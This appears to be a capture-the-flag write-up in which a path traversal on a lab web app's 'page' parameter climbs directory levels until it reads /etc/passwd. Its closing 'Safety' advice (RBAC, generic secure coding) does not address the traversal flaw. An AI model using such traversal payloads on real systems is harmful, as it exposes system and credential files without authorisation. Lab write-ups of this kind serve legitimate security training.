# Looking for a password

__http://192.168.99.101/index.php?page__

## Description and Outputs
I decided to go to the end.
```http://192.168.99.101/index.php?page=../``` = Wtf ?
```http://192.168.99.101/index.php?page=../../``` = Wrong..
```http://192.168.99.101/index.php?page=../../../``` = Nope..
```http://192.168.99.101/index.php?page=../../../../``` = Almost.
```http://192.168.99.101/index.php?page=../../../../../``` = Still nope..
```http://192.168.99.101/index.php?page=../../../../../../``` = Nope..
```http://192.168.99.101/index.php?page=../../../../../../../``` = You can DO it !!!  :]

## Flag
The flag is hidden there
```http://192.168.99.101/index.php?page=../../../../../../../etc/passwd```

## Safety
Over the exercise we need to follow the rules
Implement role-based access control (RBAC): Use RBAC to assign specific permissions and access rights to different user roles. This ensures that only authorized users can access and modify certain areas of the application.
Implement secure coding practices: Follow secure coding practices, such as using secure programming techniques, avoiding hardcoded passwords or sensitive information in the code, and properly handling error messages to avoid exposing system details.

